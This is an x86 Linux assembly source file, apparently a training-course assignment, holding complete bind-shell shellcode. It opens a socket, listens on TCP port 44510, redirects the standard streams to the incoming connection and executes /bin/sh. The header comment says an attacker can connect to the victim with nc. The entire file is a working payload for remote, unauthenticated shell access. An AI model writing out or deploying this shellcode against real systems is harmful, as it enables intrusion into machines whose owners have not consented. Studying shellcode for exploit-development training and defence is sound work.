; Program 	: bind_shell_new-reduce.nasm 
; Desription	: Shell bind TCP Port 44510=0xdead
; This program listens on TCP port 0xdead i.e. 44510
; Attacker can connect using nc <victim IP> 44510
; Usage : ./bind_shell
; Compilation and linking : ./execute.sh bind_shell
; Files are present on below address
; Github repo: https://github.com/jayeshchm/SLAE-Assignments

global _start

section .text

	_start:
		
		; socket syscall

		sub eax , eax		; 
		sub ebx , ebx		; 
		cdq			; saves edx=0
		inc bl			; socketcall 1st arg
		
		push eax		; 0 
		push ebx		; 1 SOCK_STREAM
		push byte 0x2		; 2 PF_INET

		mov ecx , esp		; socketcall 2nd arg
		mov al , 0x66		; socketcall syscall no
		int 0x80		; informs kernel for execution
		mov esi , eax		; return address

		;------------------------------------------------------------;
		; eax=0x66 , ebx=0x1 , ecx=address , edx=0 , esi=fd	     ;	     
		;------------------------------------------------------------;
		
		; bind syscall

		push edx 		; INADDR_ANY
		push word 0xdead	; binding port -> 0xdead = 44510 -> little endian 
		inc bl			; SYS_BIND=0x2
		push bx			; AF_INET
		
		mov ecx , esp		; struct sockaddr_in address
		
		push byte 0x10		; addrlen
		push ecx		; pointer to struct sockaddr
		push esi		; socket descriptor

		mov al , 0x66		; socketcall syscall no
		mov ecx , esp		; 2nd arg of socketcall
		int 0x80		; informs kernel for execution

		;------------------------------------------------------------;
		; eax=0x66 , ebx=0x2 , ecx=address , edx=0 , esi=fd          ;
		;------------------------------------------------------------;

		; listen syscall
		
		push ebx		; no of allowed connections in queue
		push esi		; socket descriptor 
		
		mov ecx , esp		; 2nd argument for socketcall syscall
		add ebx , ebx		; SYS_LISTEN = 0x4
		mov al , 0x66		; socketcall syscall no
		int 0x80		; informs kernel for execution

		;------------------------------------------------------------;
		; eax=0x66 , ebx=0x4 , ecx=address , edx=0 , esi=fd          ;
		;------------------------------------------------------------;

		; accept syscall	

		push edx	; addrlen
		push edx	; address 
		push esi	; socket descriptor
	
		inc bl		; SYS_ACCEPT = 0x5 

		mov ecx , esp   ; 2nd argument for socketcall syscall
		mov al , 0x66 	; socketcall syscall no
		int 0x80	; informs kernel for execution
		
		mov edi,eax	; file descriptor

		;------------------------------------------------------------;
		; eax=0x66 , ebx=0x5 , ecx=address , edx=0 , edi=fd          ;
		;------------------------------------------------------------;

		; dup2 null, stderr, stdout

		sub ecx , ecx
		
		dup2Loop:
				
			mov al , 0x3f	; dup2 syscall no
			mov ebx , edi	; file descriptor
			cmp cl , 0x1	; cl=0 duplicates NULL
			int 0x80
			inc cl
			jns dup2Loop

		;------------------------------------------------------------;
		; edx=0 						     ;
		;------------------------------------------------------------;
		
		; execve syscall
		
		mov al , 0xb		; execve syscall no
		push edx		; NULL
		push dword 0x68732f2f	; hs// in stack
		push dword 0x6e69622f	; nib/ in stack

		mov ebx , esp		; address of NULL terminated /bin/sh
		mov ecx , edx		; NULL
		int 0x80		; informs kernel
